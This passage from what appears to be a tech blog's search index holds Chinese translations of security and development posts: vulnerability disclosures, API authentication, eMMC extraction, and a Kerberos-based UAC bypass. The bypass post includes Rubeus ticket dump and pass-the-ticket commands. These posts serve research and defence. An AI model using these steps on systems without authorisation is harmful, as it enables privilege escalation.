攻击者只需在密钥生成或重新共享协议启动时配置恶意ID，即可窃取其他用户的私钥或使其节点崩溃。\n阈值签名方案是强大的密码学工具，但需要零知识证明、承诺方案和可验证秘密共享等复杂非标准化原语。由于缺乏实施指南，实践中常出现类似我们披露的这两个漏洞。\n阈值签名方案原理\n阈值签名允许用户组共同控制签名私钥，与多重签名(multisig)的区别在于：多重签名每个用户持有独立密钥，而阈值签名中每个用户持有同一密钥的份额。阈值签名只需生成一个组签名。\n可验证秘密共享(VSS)\nShamir秘密共享通过生成t-1次随机多项式（常数项设为密钥值），在n个不同点求值创建份额。Feldman方案在此基础上增加了可验证性。\n漏洞技术细节\n零值泄露漏洞：当多项式在x=0处求值时直接泄露常数项密钥。虽然多数实现通过检查ID非零来防护，但未对椭圆曲线群阶取模检查，导致设置ID为群阶q时仍会泄露密钥。\n模运算崩溃漏洞：计算拉格朗日系数时，若IDi ≡ SelfID (mod q)，会导致模逆不存在。脆弱实现未验证模逆直接解引用空指针。\nZKDocs发布\n我们推出非标准化密码原语文档ZKDocs，包含秘密共享等协议的完整实现细节和安全考量。例如关于零值份额漏洞的详细分析可在ZKDocs的秘密共享章节查阅。\n时间线\n2021.10.19 发现tss-lib数据泄露\n2021.12.06 向各厂商报告\n截至2021.12.20，除Clover外所有厂商均已修复\nBinance、Keep Network等团队已提交修复补丁。我们呼吁开发者：\n模运算前必须进行模约简 始终验证模逆和模平方根操作 必要时联系专业审计 ","date":"2025-08-02T00:55:39+08:00","permalink":"http://localhost:1313/p/%E6%8F%AD%E7%A7%98shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ezkdocs%E5%8F%91%E5%B8%83/","title":"揭秘Shamir秘密共享漏洞与ZKDocs发布"},{"content":"REST API认证的5种基础策略\r作为现代应用的支柱，REST API在实现数据层与表现层分离的同时，也需要通过认证机制保护敏感数据。以下是五种基础认证方法及其特点：\n基础认证（Basic Authentication）\r采用Base64编码格式在HTTP头中存储用户名密码 优势：开发工具链广泛支持，实现轻量简单 风险：凭证以明文传输，必须配合SSL/TLS通道使用 局限：缺乏原生多因素认证支持 API密钥\r通过机器生成的字符串创建凭证-令牌对 部署方式：可嵌入载荷、HTTP头或查询字符串 特点：支持凭证与访问令牌解耦，便于权限变更时撤销 风险：与基础认证同样存在凭证拦截可能 HMAC加密\r采用对称加密验证数据载荷完整性 适用场景：客户端和服务端均由单方控制的场景 挑战：移动端密钥存储安全问题，特别是URL嵌入密钥时 OAuth 2.0（黄金标准）\r五大授权类型： 授权码模式 PKCE扩展 客户端凭证 设备码 刷新令牌 核心特性： 支持动态令牌刷新 通过scope概念实现精细权限控制 可结合JWT实现载荷完整性检查 OpenID Connect\r基于OAuth 2.0的开源认证协议 三大授权类型： 授权码模式 隐式模式 混合模式 特点：简化第三方应用的用户身份验证 新兴认证方案\r令牌认证（OTP/魔法链接）\rOTP：基于TOTP/HOTP算法生成临时密码 魔法链接：含时效性验证码的URL 优势：无需记忆密码 风险：依赖传输通道安全性 通行密钥（Passkeys）\r基于WebAuthn标准的无密码方案 双重验证机制： 设备本地认证（生物识别/PIN） 公私钥加密挑战 特点：抗钓鱼攻击，但存在设备依赖风险 方案选型建议\r方案 适用场景 注意事项 基础认证 低风险数据的访问控制 必须启用SSL/TLS API密钥 需识别消费方的场景 避免URL嵌入凭证 HMAC 数据完整性要求高的封闭系统 注意密钥存储安全 OAuth 2.0 企业级复杂应用 妥善管理对称密钥分发 OpenID Connect 需平衡安全与简易性的第三方集成 控制RP权限范围 最佳实践：\n始终通过SSL/TLS通道暴露API 避免在URL/查询字符串中传输敏感凭证 采用强化的密钥管理系统 实现自动化密钥轮换机制 ","date":"2025-08-02T00:39:08+08:00","permalink":"http://localhost:1313/p/rest-api%E8%AE%A4%E8%AF%81%E7%9A%845%E7%A7%8D%E5%9F%BA%E7%A1%80%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E6%BC%94%E8%BF%9B%E6%96%B9%E6%B3%95/","title":"REST API认证的5种基础策略及其演进方法"},{"content":"系统内提取嵌入式多媒体卡(eMMC)内容\r技术背景\r现代复杂设备需要非易失性存储来保存断电时的程序和配置数据。当前市场主流方案包括串行Flash、原始NAND芯片、(micro)SD卡和嵌入式多媒体卡(eMMC)。本文重点探讨eMMC芯片的系统内交互技术，避免物理移除芯片带来的风险。\n技术挑战与解决方案\r问题1：定位电路板上的eMMC信号\r信号特征：CLK(主机提供时钟)、CMD(双向命令线)、DAT0-DAT7(双向数据线) 定位方法： 检查PCB丝印标记 追踪芯片周围走线 使用逻辑分析仪捕捉上电时的信号特征 协议分析确认有效信号 问题2：eMMC芯片供电方案\r供电选择： 利用设备原有供电系统（需处理看门狗电路等问题） 外部独立供电（需电流限制保护） 电压要求： VDDQ决定总线信号电平（常见1.8V/3.3V） 需使用双向电平转换器（推荐TI TXS系列） 问题3：系统隔离技术\r抑制系统活动方法： 仅对eMMC独立供电 强制断言SoC复位信号 禁用主引导设备 干扰时钟源（如移除晶体振荡器） 实施注意事项\r信号完整性：保持接线最短 分区访问限制：常规接口可能无法访问boot/RPMB分区 后期分析：通过用户区获取系统访问权限后扩展研究 延伸阅读\r建议进一步研究侵入式技术方案。可通过Mastodon(@InfoSecDJ)联系作者获取更多技术细节。\n","date":"2025-08-02T00:02:01+08:00","permalink":"http://localhost:1313/p/%E7%B3%BB%E7%BB%9F%E5%86%85%E6%8F%90%E5%8F%96%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%A4%9A%E5%AA%92%E4%BD%93%E5%8D%A1emmc%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/","title":"系统内提取嵌入式多媒体卡(eMMC)内容的技术指南"},{"content":"Top 15 Angular面试问题与答案\r现代软件开发行业需要精通各种流行框架（特别是JavaScript）的技能型开发者。在所有流行的JavaScript框架中，Angular是当前市场上最受欢迎的平台之一。\nAngular体系庞大且难以全面掌握，因此基于该框架的面试问题可能颇具挑战性。本文将引导你了解基础到高级的Angular面试问题，助你备战Angular开发岗位。\nQ-1. 什么是Angular？\rAngular是由Google于2016年创建的开源免费JavaScript框架，通过HTML、CSS和JavaScript等技术帮助构建现代Web和移动应用。其核心编程语言是TypeScript，作为开源前端框架特别适合创建企业级应用，支持代码重用且易于维护。\nQ-2. Angular使用了哪些技术？\r作为开发者首选的JavaScript框架，Angular通过多种技术实现特定功能：\n使用TypeScript（JavaScript的超集） 基于组件化架构 采用依赖注入设计模式 Q-3. Angular有哪些优势？\rMVC架构：模型管理数据，视图处理展示，控制器作为桥梁 依赖注入：简化开发流程，实现任务分治 双向数据绑定：自动同步模型与视图，减少开发时间 自定义指令：通过DOM属性改变元素行为 RESTful服务支持：通过ngResource模块创建可扩展API 代码生成：工具自动生成元数据和可用代码 验证支持：自动运行验证并显示错误 模板支持：支持静态模板和Angular模板 CLI工具：通过命令行初始化和管理应用 动画等高级功能：简化复杂动画实现 Q-4. Angular的主要特性是什么？\r跨平台开发：支持Windows/Mac/Linux桌面应用和移动开发 代码分割：通过懒加载优化性能 动画支持：基于Web动画API实现复杂效果 CLI工具：自动化项目搭建和配置 声明式UI：使用HTML定义界面降低复杂度 无障碍支持：遵循ARIA标准 Material组件：提供现成的UI组件库 差异化加载：根据浏览器版本发送不同代码 高性能：懒加载机制提升运行效率 Q-5. Angular的核心基础是什么？\r组件：UI构建的基本单元 Angular元素：符合Web Components标准的组件 指令：扩展HTML元素行为的类 原生移动支持：通过Ionic等方案实现 模块：应用的逻辑组织单元(NgModules) 依赖注入：提升灵活性和模块化 模板：定义组件渲染方式的HTML 路由：实现视图导航 数据绑定：组件间数据共享机制 服务：可复用的业务逻辑单元 Q-6. 什么是数据绑定？\r数据绑定建立应用UI与业务数据的连接，包含四种类型：\n双向数据绑定 字符串插值 属性绑定 事件绑定 Q-7. 什么是DOM？\r文档对象模型(DOM)以树形结构表示页面内容，Angular指令可将应用数据绑定到DOM元素属性。\nQ-8. Angular与AngularJS的区别？\r参数 Angular AngularJS 架构 指令/组件 MVC 支持 持续更新 停止维护 速度 更快 较慢 移动支持 支持 不支持 语言 TypeScript JavaScript Q-9. 解释MVVM架构\r包含三个部分：\nModel：业务逻辑和数据 View：用户界面层 ViewModel：连接View和Model的抽象层 Q-10. 什么是指令？\r指令是通过属性扩展HTML行为的特性，分为：\n结构指令 属性指令 组件指令 Q-11. 什么是Angular CLI？\r命令行工具支持：\n项目初始化 组件生成 测试执行 依赖管理 Q-12. 解释依赖注入\r设计模式特点：\n类从外部获取依赖而非自行创建 提高灵活性和模块化 注入器负责解析和提供依赖 Q-13. 认证与授权如何实现？\r认证：验证用户凭证获取访问令牌 授权：基于令牌控制资源访问 Q-14. 什么是HTTP拦截器？\r示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 @Injectable() export class TokenInterceptor implements HttpInterceptor { intercept(request: HttpRequest\u0026lt;any\u0026gt;, next: HttpHandler) { const authToken = localStorage.getItem(\u0026#39;authToken\u0026#39;); if (authToken) { request = request.clone({ setHeaders: { Authorization: authToken } }); } return next.handle(request); } } Q-15. 什么是服务端渲染？\r解决大型应用加载慢的问题：\n服务端返回完整渲染页面 浏览器接管后续交互 提升首屏加载性能 掌握这些核心知识将助你在Angular面试中脱颖而出。除了技术问题，别忘了准备开发者所需的软技能。如有疑问，欢迎在评论区提出。\n","date":"2025-08-01T23:37:27+08:00","permalink":"http://localhost:1313/p/angular%E9%9D%A2%E8%AF%95%E5%BF%85%E5%A4%8715%E4%B8%AA%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E7%AD%94/","title":"Angular面试必备：15个常见问题与解答"},{"content":"以最复杂方式绕过UAC\r虽然我不常研究这个，但发现新的UAC绕过方法总是很有趣。在阅读Rubeus工具的功能时，我意识到可以滥用Kerberos协议绕过UAC——至少在域加入系统中可行。不清楚之前是否有人记录过这种方法，有篇帖子讨论过类似技术但需要从其他系统发起攻击，而本文将描述本地实现的方案。\n技术背景\r系统默认会通过LSASS过滤网络身份验证令牌，移除本地管理员的权限。但存在关键例外：如果用户是域用户兼本地管理员，LSASS会允许网络认证使用完整管理员令牌。这在通过Kerberos进行本地认证时会产生问题——难道这不是简单的UAC绕过吗？\n实际上Kerberos有专门机制阻止这种攻击。去年我阅读了微软工程师Steve Syfuhs关于Kerberos如何防止本地UAC绕过的文章。简而言之：当用户请求服务票据时，LSASS会在TGS-REQ请求中嵌入本地安全信息，这些信息会被编码到生成的票据中。当该票据用于本地系统认证时，Kerberos会提取这些信息进行验证。\n通过分析Kerberos票据，我们发现两个关键字段：\n1 2 3 4 5 6 7 \u0026lt;Authorization Data - KERB_AD_RESTRICTION_ENTRY\u0026gt; Flags : LimitedToken Integrity Level : Medium Machine ID : 6640665F... \u0026lt;Authorization Data - KERB_LOCAL\u0026gt; Security Context: 60CE03337E01000025FC763900000000 核心绕过机制\rLSASS通过LsaISetSupplementalTokenInfo函数处理这些字段，主要检查包括：\n比较票据中的MachineID与LSASS内存中的值 检查未公开的LSA网络令牌过滤标志 验证用户SID是否属于本地账户域 当满足以下任一条件时过滤将失效：\n用户SID不属于本地账户域 LocalAccountTokenFilterPolicy策略非零 系统是域控制器(NtProductLanManNt) 两种具体利用方法\r方法一：票据重用攻击\r获取本地系统的服务票据并保存 重启系统使LSASS重新初始化 重新加载旧票据，此时MachineID不匹配导致过滤失效 1 2 3 4 PS\u0026gt; klist get RPC/$env:COMPUTERNAME PS\u0026gt; Rubeus.exe /dump /server:$env:COMPUTERNAME /nowrap # 保存Base64票据后重启 PS\u0026gt; Rubeus.exe ptt /ticket:\u0026lt;BASE64 TICKET\u0026gt; 方法二：票据伪造攻击\r利用Benjamin Delpy在kekeo中发现的非约束委派漏洞获取本地TGT 向KDC请求新的本地服务票据，填充伪造的MachineID 将伪造票据导入缓存实现UAC绕过 KERB-LOCAL的奥秘\r这个字段设计用于凭证重用，但实际使用频率很低，因为：\n仅当服务端使用Negotiate包时有效 本地Negotiate认证默认会选择NTLM协议 有趣的是，KERB-LOCAL中的值实际是LSASS堆中KERB_CREDENTIAL结构的地址和票据计数。虽然Kerberos会验证PAC中的SID匹配性，但这种实现方式可能存在安全隐患。\n[更新] 文末提供了修改Win32 SCM API以强制使用Kerberos本地认证的C++代码示例。\n","date":"2025-08-01T23:30:05+08:00","permalink":"http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/","title":"以最复杂方式绕过UAC：Kerberos协议漏洞利用详解"},{"content":"行为互联网(IoB)核心技术解析与应用前景\rIoB技术定义\rIoB(行为互联网)概念由赫尔辛基大学心理学教授Göte Nyman于2012年提出，是物联网(IoT)技术的延伸发展。其核心技术架构包含三个关键组件：\n数据采集层：通过IoT设备、可穿戴设备、社交平台等多源渠道获取用户行为数据 分析引擎：运用行为心理学模型和机器学习算法解析数据模式 应用接口：将分析结果转化为可操作的商业智能或个性化服务 核心技术实现\r设备编址体系：为每个行为分配唯一标识符(类似IP地址)，实现多源数据关联 实时处理框架：支持流式数据处理和行为预测模型更新 跨域数据融合：整合生物特征数据(心率/步数)、消费记录、社交互动等多模态信息 行业应用案例\r保险科技\r驾驶行为分析SDK集成到车载系统 事故场景重建算法(基于加速度计/GPS数据) 动态保费定价模型 数字营销\r用户兴趣图谱构建技术 实时推荐引擎架构 上下文广告投放系统(如Google Ads的IoB实现) 医疗健康\r可穿戴设备数据聚合平台 术后康复监测算法 用药依从性分析模型 技术挑战\r隐私保护：差分隐私、联邦学习等数据脱敏技术 安全防护：端到端加密传输、行为数据防篡改机制 系统集成：异构设备协议转换中间件开发 开发者技能栈\r核心语言：Python(数据分析)、JavaScript(前端可视化) 专业领域：传感器开发、行为模式识别算法 工具链：Apache Kafka(实时流处理)、TensorFlow(行为预测模型) Gartner预测到2025年全球过半人口将至少与1个IoB系统交互。该领域需要大量具备物联网架构设计、行为数据分析能力的复合型技术人才。\n","date":"2025-08-01T23:22:50+08:00","permalink":"http://localhost:1313/p/%E8%A1%8C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91iob%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%89%8D%E6%99%AF/","title":"行为互联网(IoB)核心技术解析与应用前景"},{"content":"用零知识证明重塑漏洞披露机制\r我们与约翰霍普金斯大学的合作伙伴Matthew Green正在利用零知识证明（ZK）技术建立一个可信环境，使科技公司与漏洞研究者能够安全沟通而不必担心破坏或纠纷。这项为期四年的研究将推动ZK证明从理论走向实践，为研究者提供能生成漏洞可利用性ZK证明的软件工具。该研究隶属于DARPA\u0026quot;加密验证与评估信息保护\u0026quot;（SIEVE）计划。\n为什么需要漏洞可利用性的ZK证明？\r软件厂商与漏洞研究者之间常因漏洞报告产生矛盾。研究者过度披露漏洞细节可能丧失奖励，而过早披露则可能损害企业声誉。更严重的是，当企业忽视安全团队警告时，研究者面临两难选择：保持沉默让用户处于风险，或公开漏洞迫使企业行动——后者可能反而帮助攻击者。\nZK证明将彻底改变这种局面，允许企业明确定义漏洞赏金范围，研究者则能无可辩驳地证明其拥有有效漏洞利用方案，同时避免公开披露风险。\nZK证明的设计原理\r在ZK证明中，证明者无需透露具体信息即可验证陈述真实性。例如证明知道SHA256原像而不泄露原像本身。目前最著名的工业应用是Zcash等隐私区块链，用户通过ZK证明交易合法性而不暴露任何敏感信息。\n开发高效ZK系统需权衡三个指标：\n证明生成时间 验证时间 通信带宽（证明数据量） 核心挑战在于将待证明陈述转换为无循环的布尔/算术电路。这对缺乏明确数学表述的问题尤为困难，例如包含数据依赖循环的程序必须展开处理。\n漏洞可利用性证明技术实现\r由于ZK证明接受布尔电路表述，我们需要构建仅在漏洞利用成功时返回\u0026quot;真\u0026quot;的电路。关键挑战包括：\n处理器建模：需精确模拟目标程序的编译架构。初始方案是对处理器单步运行建模，但会导致电路规模爆炸（50MB内存的100条指令轨迹将产生5GB电路）。\n内存验证优化：采用SNARKs for C的方案，将证明分为核心逻辑与内存正确性两部分。逻辑验证通过检查指令序列状态转移实现，内存验证则通过内存排序轨迹的线性扫描完成，避免直接处理整个RAM。\n防伪造机制：通过\u0026quot;置换检查器\u0026quot;电路确保内存排序轨迹的真实性。\nx86架构的特殊挑战\r从简易的MSP430 RISC架构转向复杂x86架构面临巨大挑战：\nRISC处理器每周期约1-10k逻辑门 基础x86模型处理10,000条指令可能产生48GB证明数据 我们的解决方案是：\n动态子集生成：通过程序分析确定二进制文件实际使用的x86指令子集（通常仅数百条） 静态二进制转换：对repz等运行时依赖指令，转换为可验证的子集指令 组合电路优化：避免硬编码复杂指令处理逻辑 漏洞披露新范式\r这项技术将实现：\n企业精确定义漏洞赏金范围 研究者安全提交漏洞证明 消费者保护机制：研究者可警示风险而不公开漏洞细节 我们正推动ZK证明从学术走向工业应用。如果您有特殊应用场景，欢迎联系我们——我们在ZK证明方案和电路编译器领域拥有丰富经验。\n（原文包含技术架构图表示例和论文引用，此处保留技术要点翻译）\n","date":"2025-08-01T23:16:03+08:00","permalink":"http://localhost:1313/p/%E7%94%A8%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E9%87%8D%E5%A1%91%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E6%9C%BA%E5%88%B6-%E7%AA%81%E7%A0%B4%E6%80%A7%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"用零知识证明重塑漏洞披露机制 - 突破性技术解析"},{"content":"利用Amazon Cognito为AI代理赋予用户上下文权限\rAmazon Cognito是一项托管的客户身份和访问管理（CIAM）服务，可为Web和移动应用程序提供无缝的用户注册和登录功能。通过用户池，Amazon Cognito提供了具有强大身份验证功能的用户目录，包括密码、与外部身份提供商（IdP）的联合以及用于安全机器对机器（M2M）授权的OAuth 2.0流。\nAmazon Cognito颁发标准的JSON Web令牌（JWT），并支持使用预令牌生成Lambda触发器自定义身份和访问令牌以进行用户身份验证。Amazon Cognito扩展了令牌定制功能，支持M2M的访问令牌定制以及在M2M授权期间从客户端传递元数据的能力。应用程序构建者可以利用这两个功能来支持多种用例，包括基于唯一运行时策略、权限、环境或传递的元数据定制访问令牌。这可以简化和丰富M2M身份验证和授权场景，并为新兴用例（如AI代理的身份和访问管理）开辟新的可能性。\n解决方案概述和参考架构\r在一个示例架构中（图1），用户通过Amazon Cognito用户池登录到Web或移动应用程序，并将令牌返回给客户端。在这里，应用程序可以是一个使用Amazon Bedrock代理的无服务器数字助手，需要收集和处理驻留在第三方跨域服务中的数据。AI代理通过执行OAuth 2.0客户端凭证授权来获取自己的访问令牌，同时使用aws_client_metadata请求参数传递用户的访问令牌作为上下文。AI代理接收用户上下文化的访问令牌，并调用一个信任Amazon Cognito用户池颁发者与受众的外部、第三方或跨域服务。跨域服务可以获取JSON Web密钥集（JWKS）以验证令牌并提取表示AI代理和底层用户的声明。授权在跨域服务中使用定制访问令牌的声明进行，对于细粒度授权，使用Amazon Verified Permissions。\n实现细节\rAI代理获取OAuth 2.0访问令牌\nAI代理使用Amazon Bedrock代理，配置为使用Lambda的自定义编排。当应用程序与Amazon Bedrock代理交互时，自定义编排器将用户的访问令牌传递给Lambda函数作为自定义编排的一部分。Lambda函数验证用户的令牌以确保其未过期且未被篡改。\nAmazon Cognito预令牌生成Lambda触发器\n在AI代理使用有效的客户端ID和密钥调用Amazon Cognito的/token端点后，Cognito调用预令牌生成Lambda触发器。Lambda函数验证用户的访问令牌，并定制返回给AI代理的访问令牌。\n跨域资源服务器授权检查\n跨域服务作为资源服务器需要执行授权检查。使用aws-jwt-verify库验证AI代理的访问令牌的有效性。对于细粒度授权，可以使用Amazon Verified Permissions的IsAuthorizedWithToken API。\n结论\rAmazon Cognito的M2M访问令牌定制和支持传递客户端元数据的功能为您提供了解决复杂用例的扩展能力，并支持如AI代理身份和访问管理等新兴用例。随着组织越来越多地探索AI代理的使用，拥有一个安全、可扩展的身份管理解决方案对于保持控制和问责制变得至关重要。通过使用这些新功能，您可以构建更安全和可扩展的解决方案，为自主AI代理用例的未来做好准备。\n","date":"2025-08-01T23:09:07+08:00","image":"https://i.imgs.ovh/2025/08/01/HNnbm.png","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8amazon-cognito%E4%B8%BAai%E4%BB%A3%E7%90%86%E8%B5%8B%E4%BA%88%E7%94%A8%E6%88%B7%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"利用Amazon Cognito为AI代理赋予用户上下文权限的技术解析"},{"content":"2024年2月13日（美国时间），微软发布了针对其产品安全漏洞的月度更新。本次更新涉及Windows、Exchange Server、Office等多款产品，共修复73个漏洞，其中5个漏洞在更新发布前已被公开利用，3个漏洞CVSS评分高达9.8分。\n关键漏洞警示\r以下漏洞需优先处理：\nCVE-2024-21351：Windows SmartScreen安全功能绕过漏洞 CVE-2024-21412：互联网快捷方式文件安全功能绕过漏洞 CVE-2024-21410：Exchange Server权限提升漏洞（CVSS 9.8） 高危漏洞\rCVE-2024-21413：Outlook远程代码执行漏洞 CVE-2024-21401：Microsoft Entra Jira单点登录插件权限提升漏洞 重要更新说明\rExchange Server：安装CU14后默认启用扩展保护功能\n安全启动：新增UEFI CA信任锚点，4月开始分阶段部署\n受影响产品清单\r产品系列 最高严重等级 主要影响 KB编号/链接 Windows 11/10 紧急 远程代码执行 5034765/5034763 Exchange Server 紧急 权限提升 更新指南 .NET Framework 重要 服务拒绝 详情 更新建议\r企业用户应立即评估Exchange Server漏洞风险 启用自动更新或通过安全更新指南手动下载 关注ADV990001获取服务堆栈更新 下次安全更新计划于2024年3月12日发布。建议通过安全更新指南API建立定制化监控方案。\n","date":"2025-08-01T23:01:47+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/","title":"微软2024年2月安全更新：修复多款产品高危漏洞"},{"content":"我们如何审查首批DKLs23库之一——来自Silence Laboratories的Silent Shard\r2023年10月，我们审计了Silence Laboratories基于DKLs23阈值签名方案(TSS)的库Silent Shard——这是当时首个采用茫然传输(OT)替代传统Paillier密码学的生产级实现。我们的审查发现了可能导致密钥销毁攻击的严重缺陷，Silence Laboratories已及时修复。\n审计三大核心发现\r协议实现的自由度：DKLs23规范赋予实现者选择子协议（基础OT、OT扩展、成对乘法）的极大自由度，需同时研究规范文档和具体实现选择 OT系统的优势：基于OT的系统通常比Paillier系统更不易出错，只需防范选择性中止攻击就能简化安全验证 TSS基础要素：所有TSS方案都需要关注安全P2P通信、广播和共识验证等基础机制 创新库Silent Shard\rSilence Laboratories由学术和工业界科学家组成，其开发的Silent Shard库支持包括MetaMask加密货币钱包在内的多种应用场景。该库基于创新的DKLs23协议构建，采用茫然传输(OT)而非Paillier加密系统来实现ECDSA签名，这种OT方案因其性能优势和Paillier系统的脆弱性（如BitForge和TSShock漏洞）近年备受关注。\n审计方法论\r文档审查：人工审查技术文档并与开发团队定期沟通 自动化分析： 使用cargo-audit检查依赖漏洞 通过Clippy识别Rust常见错误 采用cargo-llvm-cov分析测试覆盖率 运用定制工具Dylint检测代码质量问题 关键安全发现\r高危漏洞\rTOB-SILA-6：通信通道nonce复用问题\n可能允许恶意方篡改协议消息导致密钥销毁攻击。修复方案：为通道双向通信使用不同密钥。\nTOB-SILA-12：选择性中止攻击处理缺陷\n错误处理导致程序panic，无法正确识别恶意方。修复方案：明确返回包含被禁方ID的AbortProtocolAndBanReceiver错误。\n侧信道分析\r代码库通过subtle等crate实现恒定时间操作，有效防御了大多数侧信道攻击。仅在eval_pprf函数中发现存在时序信息泄露风险（实际攻击难度较高）。Silence Laboratories已提交补丁消除该泄漏。\n长期建议\r完善文档：特别是关于错误处理的文档，这对TSS系统至关重要 增强负面测试：可提前发现如TOB-SILA-1/2等问题，覆盖率分析也证实该需求 审计结束后，Silence Laboratories已修复14/15的安全问题，并持续改进文档和测试体系。\n关于TSS协议安全\r我们的密码学团队现已完成对ECDSA、Schnorr和BLS等所有主流TSS协议的安全评估，并为相关签名方案提供Go/Rust实现服务。如需TSS协议安全审查或工程实现，欢迎联系我们获取免费咨询服务。\n","date":"2025-08-01T22:54:49+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90silent-shard-dkls23%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E5%8F%91%E7%8E%B0/","title":"深度解析Silent Shard DKLs23阈值签名库的安全审计发现"},{"content":"加密货币劫持的技术实现\r随着比特币价值暴涨，网络安全专家警告称加密货币劫持攻击可能将用户设备变为非法挖矿工具。该技术通过未经授权在网站访问者浏览器中运行加密货币挖矿脚本实现：\n无恶意软件入侵：攻击者将Coinhive等挖矿脚本植入网站，当用户访问时自动加载JavaScript 资源劫持机制：脚本会消耗用户设备的CPU算力和电能进行加密货币挖掘 隐蔽性特征：当前主要针对门罗币（Monero）进行挖掘，相比比特币更不易被察觉 攻击规模实证数据\r移动安全厂商Wandera分析10万+移动设备发现：29%的企业至少有一台智能设备运行门罗币挖矿脚本 独立研究员Willem de Groot发现：2,500个热门网站存在加密货币劫持脚本 技术演变关键问题\r比特币价值飙升会否导致针对比特币的劫持攻击增加？ 鉴于挖矿对计算资源的高消耗，攻击者会否开发新型系统入侵手段？ 终端用户应采取哪些技术防护措施？ 本文源自TechTarget《Risk \u0026amp; Repeat》播客的技术讨论，完整分析包含浏览器脚本注入、资源监控防御等专业技术细节。\n","date":"2025-08-01T22:47:25+08:00","permalink":"http://localhost:1313/p/%E6%AF%94%E7%89%B9%E5%B8%81%E7%83%AD%E6%BD%AE%E4%B8%8B%E7%9A%84%E9%9A%90%E7%A7%98%E5%A8%81%E8%83%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/","title":"比特币热潮下的隐秘威胁：加密货币劫持技术剖析"},{"content":"JetBrains宣布更新其编码助手Junie\rJunie现已完全集成到GitHub中，支持异步开发功能，包括：同时委派多个任务、无需打开IDE即可快速修复问题、直接在GitHub中进行团队协作，以及无缝切换IDE和GitHub。GitHub版Junie目前处于早期访问计划，仅支持JVM和PHP。\nJetBrains还新增了对MCP的支持，使Junie能连接外部数据源。其他新特性包括任务完成速度提升30%，以及支持macOS和Linux的远程开发。\nGemini API推出首个嵌入模型\r这类模型可为单词、短语、句子和代码生成嵌入向量，提供比关键词搜索更精准的上下文感知结果。\u0026ldquo;它们能高效地从知识库中检索相关信息（以嵌入向量表示），并作为附加上下文输入语言模型，引导生成更明智和准确的响应。\u0026ldquo;Gemini文档说明。\n该嵌入模型支持100多种语言和2048个输入token长度，将通过免费和付费双层级开放，方便开发者免费实验后按需扩展。\nAmazon为SageMaker新增功能\r用户现可直接从SageMaker Unified Studio启动Amazon QuickSight，利用项目数据构建仪表板并分享至Amazon SageMaker Catalog供组织内成员发现。\n新增支持Amazon S3通用存储桶（便于查找和协作数据）及S3 Access Grants（实现细粒度访问控制）。用户还可将AWS Glue Data Catalog数据集导入SageMaker目录。\n\u0026ldquo;这些新功能在统一治理框架下覆盖完整数据生命周期：自动接入湖仓中的结构化数据、无缝编目Amazon S3的非结构化内容、通过QuickSight简化可视化流程。\u0026ldquo;AWS在博客中写道。\n","date":"2025-08-01T22:40:34+08:00","permalink":"http://localhost:1313/p/jetbrains%E5%8D%87%E7%BA%A7junie%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8Bgemini-api%E6%96%B0%E5%A2%9E%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B%E7%AD%89%E6%8A%80%E6%9C%AF%E5%8A%A8%E6%80%81/","title":"JetBrains升级Junie编码助手、Gemini API新增嵌入模型等技术动态"},{"content":"程序员最佳桌面配置（终极指南）\r作者：John Sonmez\n一个专业、高效且美观的工作环境无疑能让你成为更高效、更快乐的程序员。那么实现这一目标需要考虑哪些因素？\n人体工学设计 屏幕尺寸与布局 硬件质量 必要配件 视觉氛围 让我们深入探索最佳程序员桌面配置方案，为改造现有空间或从零打造完美编程洞穴提供灵感：\n程序员桌面第一法则——选择合适的显示器\r编程显示器是工作台的核心部件，需谨慎选择。目标是在获得充足屏幕空间的同时，避免因尺寸过大导致颈部疲劳。无论是双屏/三屏、横竖组合、平面/曲面、16:9或超宽屏，都要确保能显示所有编程所需应用且不过分庞大。\n建议寻找视觉表现与工作效率的最佳平衡点。若想深入了解理想编程显示器配置，可参考我们关于该主题的专题文章。\n推荐编程显示器：Dell Ultrasharp 